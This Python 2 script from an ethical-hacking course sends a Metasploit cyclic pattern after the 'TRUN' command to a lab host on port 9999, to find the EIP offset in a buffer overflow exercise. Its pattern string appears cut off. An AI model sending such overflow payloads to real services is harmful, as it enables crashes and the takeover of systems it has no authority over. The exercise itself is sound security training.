#!/usr/bin/python2

#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section.
#You can paste the "payload" from simplefuzzer as the value of the "offset" parameter value in this script.
#This will give you the EIP in your debugger program to paste into the promt from the simplefuzzer tool in order to find the offset.

import sys, socket

#Target IP
ip = '192.168.50.13'
#Target port
port = 9999
#Vulnerable command of program
COMM = 'TRUN /.:/'
#Corresponds to "payload" from output of simplefuzzer and output from Metasploit pattern_create.rb
offset = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag>

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((COMM + offset))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
